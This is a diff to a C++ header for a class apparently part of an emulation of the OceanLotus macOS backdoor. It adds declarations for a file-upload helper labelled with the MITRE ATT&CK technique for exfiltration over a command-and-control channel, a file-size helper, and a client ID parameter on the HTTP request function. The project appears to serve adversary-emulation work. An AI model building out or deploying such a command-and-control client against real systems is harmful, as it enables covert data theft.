@@ -4,6 +4,8 @@
 #include <chrono>
 #include <fstream>
 #include <iostream>
+#include <sstream>
+#include <sys/stat.h>
 #include <cstdio>
 #include <thread>
 #include <dlfcn.h>
@@ -59,6 +61,25 @@ namespace client {
     */
     bool downloadFile(std::vector<unsigned char> payload, std::string path);
 
+    /*
+    uploadFile
+        About:
+            Helper function to read file bytes from the given path
+        Result:
+            vector<unsigned char> - file bytes
+        MITRE ATT&CK Techniques:
+            T1041 Exfiltration Over C2 Channel
+    */
+   std::vector<unsigned char> uploadFile(std::string path);
+
+   /*
+   getFileSize
+        About:
+            Helper function to get the file size from the given path
+        Result:
+            int - file size represented in bytes
+   */
+  int getFileSize(std::string path);
 }
 
 class ClientPP
@@ -164,7 +185,7 @@ public:
             https://www.welivesecurity.com/2019/04/09/oceanlotus-macos-malware-update/
         References:
     */
-    static std::vector<unsigned char> performHTTPRequest(void* dylib, std::string type, std::vector<unsigned char> data, unsigned char * instruction);
+    static std::vector<unsigned char> performHTTPRequest(void* dylib, std::string type, std::vector<unsigned char> data, unsigned char * instruction, std::string clientID);
 
     ~ClientPP();
 
